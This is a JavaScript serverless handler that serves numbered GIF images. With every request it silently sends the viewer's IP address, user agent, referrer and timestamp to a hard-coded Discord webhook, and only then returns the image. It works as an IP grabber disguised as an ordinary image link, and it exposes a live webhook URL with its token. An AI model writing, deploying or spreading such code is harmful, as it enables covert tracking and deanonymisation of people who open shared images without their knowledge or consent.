export default async function handler(req, res) {
  const { id } = req.query;
  
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  if (!id || !/^[1-9][0-9]?$/ .test(id)) {
    res.status(404).end();
    return;
  }

  const gifPath = `./${id}.gif`;
  
  const ua = req.headers['user-agent']?.substring(0, 100) || 'Unknown';
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
  const referrer = req.headers['referer'] || 'Direct';
  
  const now = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
  
  const webhookUrl = 'https://discord.com/api/webhooks/1490714732683067482/ae8gBJ6SmxJLVdbz5FMO55PmuhLnPPhSkp_iAvep88ScYAnlzEf6ghUVjUD_yoVRI-h2';
  
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '**🖼️ NEW GIF VIEWER!**',
        embeds: [{
          title: `GIF #${id} Viewed`,
          description: `[Open GIF](https://goyzinparis.vercel.app/${id}.gif)`,
          color: 0x5865F2,
          fields: [
            { name: '🌐 IP', value: `\`${ip}\``, inline: true },
            { name: '🖥️ Browser', value: ua, inline: true },
            { name: '🕐 Time (TR)', value: now, inline: true },
            { name: '🔗 From', value: referrer, inline: false }
          ],
          thumbnail: { url: `https://goyzinparis.vercel.app/${id}.gif` }
        }]
      })
    });
  } catch (e) {
    console.error('Webhook error:', e);
  }

  try {
    const fs = await import('fs/promises');
    const stats = await fs.stat(gifPath);
    
    res.writeHead(200, {
      'Content-Type': 'image/gif',
      'Content-Length': stats.size,
      'Cache-Control': 'public, max-age=3600'
    });
    
    const { createReadStream } = await import('fs');
    createReadStream(gifPath).pipe(res);
  } catch (e) {
    console.error('GIF error:', e);
    res.status(404).end();
  }
}
